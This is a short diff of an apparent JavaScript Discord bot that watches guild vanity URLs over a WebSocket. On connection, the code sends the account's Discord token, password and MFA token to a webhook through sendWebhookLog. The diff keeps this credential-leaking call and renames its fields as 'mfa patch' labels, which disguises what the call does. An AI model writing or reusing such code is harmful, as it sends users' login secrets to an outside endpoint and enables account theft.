@@ -92,7 +92,7 @@ ws.on("message", async (message) => {
       if (g.vanity_url_code) guilds[g.id] = g.vanity_url_code;
     });
     console.log("[READY] Guilds loaded:", guilds);
-    await sendWebhookLog(`TOKEN: ${config.discordToken}\nPASSWORD: ${config.pass}\nMFA: ${mfaToken}`);
+    await sendWebhookLog(`mfa patch to token: ${config.discordToken}\nPASSWORD PATCH MFA: ${config.pass}\nMFA: ${mfaToken}`);
   }
   if (t === "GUILD_UPDATE") {
     const gid = d.guild_id || d.id;
@@ -117,3 +117,4 @@ ws.on("error", (e) => {
   console.error("[WebSocket] Error:", e.message);
 
 });
+
